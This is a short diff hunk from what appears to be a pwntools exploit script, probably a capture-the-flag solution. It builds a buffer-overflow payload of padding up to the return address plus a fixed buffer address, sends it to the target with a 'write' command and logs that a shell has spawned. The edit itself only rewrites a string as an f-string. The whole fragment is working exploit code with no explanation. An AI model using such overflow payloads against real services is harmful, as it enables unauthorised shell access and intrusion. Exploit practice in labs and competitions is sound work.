@@ -44,7 +44,7 @@ overflow = 'A'*(0xef)     # bytes required to hit return address
 overflow += p32(0x0804F0E0) # decode buffer
 
 log.info("Sending overflow:\n%s" % hexdump(overflow))
-r.sendline('write ' + overflow)
+r.sendline(f'write {overflow}')
 r.clean(1)
 
 log.info("Shell spawned...")
